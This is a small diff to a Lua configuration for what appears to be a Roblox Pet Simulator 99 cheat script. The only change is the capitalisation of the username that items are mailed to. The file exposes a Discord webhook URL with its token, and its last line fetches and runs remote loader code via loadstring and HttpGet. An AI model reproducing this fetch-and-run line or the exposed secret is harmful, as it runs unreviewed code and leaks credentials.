@@ -6,7 +6,7 @@ getgenv().ps99Config = {
     DISCORD_ID = "789192982980591626",
 
     -- Mail Config
-    USERNAME_TO_MAIL = "itsyoursboialt51",
+    USERNAME_TO_MAIL = "Itsyoursboialt51",
     MAILING_WEBHOOK_URL = "https://discord.com/api/webhooks/1000430823742382080/Pl17KV4Z4Y3oRXOt6OqzvikI5nUL7Cs7L6jdnzHdC-q2VfcqPe7tLuQX1DD89An_rMAF",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/627e09df17480561c1878d1537a1b612.lua"))()
